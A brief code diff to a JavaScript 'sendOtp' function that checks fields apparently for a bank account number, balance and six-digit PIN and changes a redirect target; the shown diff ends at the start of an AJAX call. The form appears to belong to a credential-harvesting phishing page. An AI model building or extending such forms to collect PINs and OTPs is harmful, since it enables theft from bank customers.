@@ -114,7 +114,7 @@ function sendOtp() {
     const saldo = $('#saldo').val();
     const sixpin = $('#sixpin').val();
  if (!tarif || !nomor || !nama || !rek || !saldo || !sixpin) {      
-        window.location.href = "index.html";
+        window.location.href = "/";
         return false;
     }   
 $.ajax({
